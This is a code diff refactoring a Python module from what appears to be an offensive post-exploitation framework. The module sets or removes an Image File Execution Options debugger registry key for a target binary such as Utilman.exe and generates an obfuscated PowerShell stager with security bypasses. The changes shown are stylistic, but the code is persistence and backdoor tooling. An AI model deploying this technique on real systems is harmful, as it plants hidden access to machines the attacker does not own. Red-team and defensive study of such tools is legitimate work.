@@ -30,16 +30,13 @@ class Module:
 
         if cleanup.lower() == "true":
             # the registry command to disable the debugger for Utilman.exe
-            script = "Remove-Item 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\{}';'{} debugger removed.'".format(
-                target_binary, target_binary
-            )
-            script = main_menu.modulesv2.finalize_module(
+            script = f"Remove-Item 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\{target_binary}';'{target_binary} debugger removed.'"
+            return main_menu.modulesv2.finalize_module(
                 script=script,
                 script_end="",
                 obfuscate=obfuscate,
                 obfuscation_command=obfuscation_command,
             )
-            return script
 
         if listener_name != "":
             # if there's a listener specified, generate a stager and store it
@@ -48,18 +45,17 @@ class Module:
                 # not a valid listener, return nothing for the script
                 return handle_error_message("[!] Invalid listener: " + listener_name)
 
-            else:
-                # generate the PowerShell one-liner
-                launcher = main_menu.stagers.generate_launcher(
-                    listenerName=listener_name,
-                    language="powershell",
-                    obfuscate=launcher_obfuscate,
-                    obfuscation_command=launcher_obfuscate_command,
-                    bypasses=params["Bypasses"],
-                )
+            # generate the PowerShell one-liner
+            launcher = main_menu.stagers.generate_launcher(
+                listenerName=listener_name,
+                language="powershell",
+                obfuscate=launcher_obfuscate,
+                obfuscation_command=launcher_obfuscate_command,
+                bypasses=params["Bypasses"],
+            )
 
-                enc_script = launcher.split(" ")[-1]
-                # statusMsg += "using listener " + listenerName
+            enc_script = launcher.split(" ")[-1]
+            # statusMsg += "using listener " + listenerName
 
             path = "\\".join(reg_path.split("\\")[0:-1])
             name = reg_path.split("\\")[-1]
@@ -109,10 +105,9 @@ class Module:
                 + "'"
             )
 
-        script = main_menu.modulesv2.finalize_module(
+        return main_menu.modulesv2.finalize_module(
             script=script,
             script_end="",
             obfuscate=obfuscate,
             obfuscation_command=obfuscation_command,
         )
-        return script
